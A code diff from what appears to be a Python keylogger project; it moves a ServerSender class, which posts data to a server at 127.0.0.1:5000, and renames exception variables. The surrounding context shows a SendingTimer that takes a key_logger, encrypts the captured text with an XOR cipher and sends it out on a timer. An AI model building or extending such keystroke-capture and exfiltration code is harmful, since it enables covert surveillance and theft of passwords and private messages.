@@ -47,6 +47,38 @@ class XorCipher:
         return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(text, key_cycle))
 
 
+class ServerSender:
+    def __init__(self, server_url="http://127.0.0.1:5000/data"):
+        self.server_url = server_url
+
+    def get_data(self):
+        try:
+            response = requests.get(self.server_url)
+            if response.status_code == 200:
+                data = response.json()
+
+                combined_data = {}
+                for entry in data:
+                    combined_data.update(entry)
+
+                return combined_data
+            else:
+                print(f"Failed to get data: {response.status_code}, {response.text}")
+                return {}
+        except Exception as err:
+            print(f"Error getting data: {err}")
+            return {}
+
+    def send_data(self, data):
+        try:
+            response = requests.post(self.server_url, json=data)
+            if response.status_code == 201:
+                print("Data sent successfully!")
+            else:
+                print(f"Failed to send data: {response.status_code}, {response.text}")
+        except Exception as err:
+            print(f"Error sending data: {err}")
+
 class SendingTimer:
     def __init__(self, server_sender, cipher, key_logger, time_to_send=10):
         self.server_sender = server_sender
@@ -68,39 +100,6 @@ class SendingTimer:
         for window, timestamps in data.items():
             encrypted_data[window] = {timestamp: self.cipher.encrypt(text) for timestamp, text in timestamps.items()}
         return encrypted_data
-
-
-class ServerSender:
-    def __init__(self, server_url="http://127.0.0.1:5000/data"):
-        self.server_url = server_url
-
-    def get_data(self):
-        try:
-            response = requests.get(self.server_url)
-            if response.status_code == 200:
-                data = response.json()
-
-                combined_data = {}
-                for entry in data:
-                    combined_data.update(entry)
-
-                return combined_data
-            else:
-                print(f"Failed to get data: {response.status_code}, {response.text}")
-                return {}
-        except Exception as e:
-            print(f"Error getting data: {e}")
-            return {}
-
-    def send_data(self, data):
-        try:
-            response = requests.post(self.server_url, json=data)
-            if response.status_code == 201:
-                print("Data sent successfully!")
-            else:
-                print(f"Failed to send data: {response.status_code}, {response.text}")
-        except Exception as e:
-            print(f"Error sending data: {e}")
 
 
 if __name__ == "__main__":
